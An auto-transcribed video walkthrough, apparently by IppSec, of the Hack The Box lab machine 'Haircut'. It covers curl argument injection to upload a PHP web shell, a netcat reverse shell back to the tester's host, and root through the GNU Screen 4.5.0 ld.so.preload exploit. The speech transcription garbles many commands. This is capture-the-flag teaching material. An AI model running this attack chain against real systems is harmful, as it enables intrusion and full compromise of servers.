 hey guys this is IPSec and we'll be doing haircut from half the box this box starts off frustrating because it involves dirt Buster finding a page but once it finds a page then exploiting become straightforward because you'll notice it's using curl you can inject arguments and curl and then change what rights file to so upload PHP she'll use it done the previs is awesome because it involves out-of-date software but not in the kernel and I love that because so many times pen tester sees a server that hasn't been updated since 2016 and they go to dirty count because dirty cow is sexy but if you know dirty cow has a relatively good chance of crashing a box so this box involves hunting set UID binaries and finding a out-of-date package on that which has an exploit so you can get shell that way and it's much much more stable than dirty cow or any kernel exploit can be because there's no possibility of crash in the box so that's why I love the previs kiya and we'll get into the box now so you know the drill by now we and map it first so add map SC say scripts as fee enumerate version Oh a I'll put all formats and the IP address which is 1010 1024 looking at the output we do see it only listening on to ports that is 22 for SSH and 80 for HTTP so let's go over to the web server to see what it looks like and we just see a giant image right click view image we see the images name bounce we can go back view the source and don't see anything interesting here so this is where I'd start poking around manually and doing things like robots dot txt but whenever I do anything manually I like having something go in the background in this case it's going to be a derp buster I'm using go buster in this video because this is probably my favorite one it does have the one bug where it won't show you the length of HTTP redirects but go Buster really fast command-line and I just like it on the command line more than like derp Buster that's Java because I can run it from other boxes gooeys just mean I have to run from my own box I can't SSH somewhere then run dirt Buster easily doh best herb the Java version does have a command line version but it's not flush but enough ranting let's go first you have to do app install golang if you don't have go installed and then you can run it with go run and if you don't have go Buster you can just google github go Buster and find it that way so we do see we're missing two patches will quiet it on this if this was Python we just do pip install but since it's go we have to do we have to set a go path first so export go path equal / root slash go and then make sure that directory exists it already exists in mine so then you can just say go get and then copy what I have highlighted paste it it goes downloads and I guess installs it to your go path so go get both of those and now when we do go run it doesn't error if we don't want to keep doing go we we just want to compile it we just do go build and that gives it a nice executable so doing - H we see a bunch of flags so to mimic what we want to do in go buster order buster first my specify the URL so 10 10 1024 let's output the length of the body then the word list will use user share wordless der buster directory list to 3 medium and you'll notice in this video I'm not cheating I'm just using the entire world list and that's just because of how fast this can actually run then we want to set the file extension to PHP so - X PHP and this will take everything in this list and also append dot PHP to it and then 4 threads let's just do 20 threads so how name this window go Buster I guess order her name helped me and then we can go poke around so we can try things like an men test out HTML and we get another image looking at this no hints go back to a window and we hoodie see exposed dot PHP so we can go over to this see what that PHP file looks like and and a hairdressers location you would like to check example localhost test HTML so we found out what that test HTML was if we click go what happens request the site and displays it so let's set up a Python simple HTTP server and see if we can get a request to go to us so 10 10 14 13 I think is my IP we'll see it comes to us if config 10 10 14 13 let's try that again HTTP 10 10 oh I only did eight hundred not 8000 there we go and we see how not found it does get to us and we went back we also see a curl error message so one of the things you can do is look at all the arguments for curl and see exactly what happens but before you start going that route curls a command line program so let's intercept this request and see if we can do basic command injection again just doing this to make it a bit easier I had press ctrl or I to send that down the request for for nothing let's see let's undo the encoding to make it easier to look at and shy like semicolon LS what do we get that is not a good thing to put in a URL so it's got some type of filtering so if we do pipe this to bash sir then Inc curls to this file it executes sit nothing so these were then we input like arguments because we assume it's written in a way like system dot slash curl CMD so if we make CMD equal it's actually URL so if we set URL to be like - oh four out file and then specified upload slash test and then put a space we can inject the argument in curl so that's what we're gonna try next and I'm just gonna try with - because I've never done that see what this does so we see the curl version protocols it supports so we injected the argument - V so why did I say uploads right away because if we go back to go Buster we see this directory uploads exists and I should have went to this honestly to show what it was proxy intercept off don't go to Cali dot org 1010 1024 oh my god stop changing my url why I'm typing and we get a forbidden so [Music] so here so what we're going to try to do is write a file to that uploads directory so Peter so - oh for a dub dub dub HTML uploads test and we just need a touch world to test out HTML so we see it got it it saved the file and does it exist so we can get this and change this to uploads test of HTML file not found okay so let's go back to repeater and one thing good and I do be Khan talk I forget which one you can actually double click that and write something so we can title this curl injection and we can title this file verify instead of game that one or two so we can just try not specifying the absolute path and just do relative assume we're in the web route already and just do uploads / o slash test I had test out HTML if we do test not allowed let's get and we get it okay that's why I hasn't made the mistake so I thought that would work so we can now say shell dot PHP and then go to one of a shell cell B shell dot PHP PHP echo system [Music] Qwest Epps ACK this goes single quotes I really hope that's correct so change it here click go we downloaded and now we can go shell dot PHP if SEC equals LS and we have command injection awesome so let's make this shell dot PHP actually give us a shell so let's test out and see so NCE been SH the IP address 1010 1413 oh and listen on port 8081 so let's do this and see elf EMP 8081 you name this to reverse shell okay hit go and we get a connect back it doesn't give us a prompt right away so it's not completely obvious but if we do like LS or hostname we do see we have a shell that's why I always like doing that - V option so we see the connect back because if we didn't I can show you real quick we take that out Ln P go you have no sign you get a shell so always use - V on that so you know if something does connect back so the next step is to get a actual shell that we can do like tap water and clean all that stuff so Python - sea and port PT y PT y dot spawn and bash you've seen me do this a hundred times and nothing happens that's odd Python - see hello world nothing so we do which Python and get nothing I'm just gonna copy this because I want to save this text one have to type this over again let me just do locate Python to see if pythons installed anywhere because it's definitely not in a path and we see python 3 5 so if we do that copies not gonna help me Python 3 - see print hello world nothing that's bizarre but when you think about it it's not that perverts are because Python 3 changed the syntax up a little bit you can't do print then space you have to do the parentheses so doing this execution so let's try python 3 - see and put PT y PT y dot spawn then - and we get a shell still can't do tab water completion as you see so control z background it s TTY raw - echo FG Anna - foreground and now we have tab auto completion so the next step would be to go dev s hm or just any directory and we're going to do a Linux enumeration so move this let's go to Lynn Prive esque and then we can W get the files and again that won't exist on your box unless you've created it it's just why I put all my privilege escalation shells and I want W get - ah well privilege escalation scripts not shells so do a LS we can see we have the linen MSH Linux projector and UNIX Prive ask so let's do Python 3 Linux projector it airs out because again print changed so we can run 2 to 3 and then try that the - W writes changes Python 3 when X prove checker and still errors out so what that 2 to 3 does is it's a Auto conversion script that sometimes works to get a script working on Python 3 that was spiced on to but in this case it didn't so we're stuck with Len enum so running through this it's going to take a little bit execute well that's going we can plants around so we see the kernels from 2017 probably no profess clear recently updated it's Ubuntu 1604 first names haircut has a user Maria shells going through the Crone's I'm looking to see if we have write access to anything or if there's nothing out of the ordinary there everything looks default then see what else it does up so we don't see it talking to any other boxes on its local network so no lateral movement name server default route it's got my sequel listening on port 3306 only on localhost so that explains why we didn't say it through her head map but why does it have my sequel because well that web page definitely didn't use my sequel so running process is conveniently next so we can see if my sequel is running as root or the my sequel user if it's running as root that becomes a much more juicy target so my sequel should be around here there it is it's not it's running as the my sequel so even if we exploit the service we don't get root we get my sequel and in some cases there are privilege escalations that only work when you're the my sequel user to get to root but it's not for this box so we won't go into that I'm not even sure if it's vulnerable it's not something I checked so associated permissions and then indie pseudo one eight one six my sequel version it's going through Apache home directories we have GCC installed this is useful to know so if we have exploits we don't have to cross compile them to this from our box or just set up a box that has the same Lib C version all that don't worry about that because we can compile straight on this server I can't read the shadow file or write to any other files and that's about it so since that failed the next thing I would do is just look through the set UID binaries so we do find / - perm anything with the set UID bit set pipe that to dev null and there's probably a - exec flack you could do but I or what that I always just do pipe it to Zergs at last - la so this will show us permissions and owner so we see the sent UID binaries the one that sticks out is this screen because it has the version information in it and I know there's been a professor recently with screen this prevents only affected I think like Debian Ubuntu arch because Green had the set UID bit set on those red hat CentOS did not have it but if you didn't know that you would just simply open up what there we go open up a side window and then search point down the list copy like search point su that's not a good one G fast WD fuser mount and literally just go down the list but if we do screen we see Jen you screen for 5-0 so let's see how this looks go to the proof-of-concept one first and we can see let's see what it's doing the check opens the log file with full route privilege this allows us to truncate any file or create route own files with contents and any directory that can be easily exploited so okay so it's saying since screen is a sent UID binary and at the very beginning it tries to open a log file if that log file doesn't exist it opens it as root and you can place content in it and if you place content in a file owned by root well bad things happen like for instance you could create Cron's and do all various sorts of mischief so he's on screen - version so we can mimic that screen - - version we see we are running the same thing he's doing ID to show he doesn't have any root permissions days going in the Etsy directory we just will do temp right now and then running screen - D - m/l blah blah echo fail so see we run that and then we cat blah blah we don't have anything and but we have it owned by root so that is odd that that didn't put the contents in but it is owned by root so that portion worked so the next step would be to look at the other one so search played screen this one is this similar okay so this is okay here's a screen command so screen - D again this is detached M I think is just create the session anyways ignore TTY or something but - D so screen doesn't actually open up it just goes in the background - tells the log file it's creating LD I so preload and what this does is allows a library to load or be pre-loaded before a process and it's pre loading temp Lib hacks SL and this is temp dot web access so we see it's a constructor which means this library gets executed as soon as it's loaded and then does the CH drone chmod and then unlinks itself and then prints done so temp root cell that's this file down here is doing a set UID GID effective UID effective GID - all 0 which is root and then executing bin Sh then it compiles them removes the source code and then goes into Etsy sets the you mask to 0 0 0 just so new files created or either 777 or 666 permission based upon how they're open and then it triggers the exploit so the one thing it's doing that we didn't was that echo - and II so I won't try that real quick so instead of that blah blah let's try echo - n e backslash x0 a that's a new line and then fail let's try that what this does cat blah blah it's still nothing so I'm not sure why that's doing that it's try blah blah - it has to be a new file weird anyways let's go ahead and do this exploit so I really hate how it creates all these files for us so I'm going to copy them out and create them manually so we know nothing's gonna fail because nothing's worse then the script automatically does a bunch of things and it failed along the way but keeps going and hoses something so let's copy this exit so we just get one big thing create a new window search plate X so we want to copy this so this is gonna be slash temp lib hacks dot see and we could just copy this whole thing probably you know we don't have to go envy okay so we got temp maybe not so let's V tap root shell got see that that pleat that line I have no clue it's going on try this again let's only copy what we want and not be fancy there we go so in a temp we have Lib hacks and root shell dot C so let's now compile them so no special flags there CC one something happen there GCC slash temp root shell not sure what's going on so let's just change this so I know and this is why we create the files before just running that script this should cut file right here tryna X I honestly have no clue what this is saying GCC temp root shell dot C huh see you name - a this is a 64-bit machine so something's weird going on that let us just compile on a box since that's Ubuntu this is Kali birth off Debian and 64-bit so let's hope the root show about see copy set pace so I can paste and then we want Lib hats dot see that's annoying okay so it wants us to GCC this let's see if we get the same error root show not see we're not using temp they're just right there there we go compiled let's do the same thing for this get rid of town warning okay we got lib hacks and root shell so exit that go back here python simple HTTP and now we'll W get 10 10 14 13 8,000 Lib hacks Don s o W get 10 10 14 13 8,000 root shell was it this those two hundreds so we got the files now is it - C - copy - H examine case exact - P okay now we edit the script to remove what we did so now this script is really simple let's try the soc download the script we have to Python okay we got the script verify yes we have modified it so it's not going to clobber the files we manly did and we just run screen SH and hope for the best no such follow directory that's not good cat bla bla wait it created the LD preload here it should have done that in XE huh it doesn't really give CD to slash Etsy it did not so well just man we do all this so now we're going to create that LDS Oh preload and really hope the best okay we see we created the file and what do we do after that screen - LS to trigger it LDS o dot preload cannot be pre-loaded cannot open shared object file ignored lib hacks see okay so that air message was actually expected so but if we look at West - la flashtab grap root we see root shell owned by root and it's got the sticky bit set so we do slash tap root shell we are root and we could cat root dot txt if we want it to so don't do that so you can't just copy and paste the flag but that was it hopefully that's fine I really hate that error message comes up and makes you think it failed when it really didn't fail so and we can go into Etsy and grab for LD again because make sure that file is not there it did clean itself up so that is hair cut hope you guys enjoyed the video and take care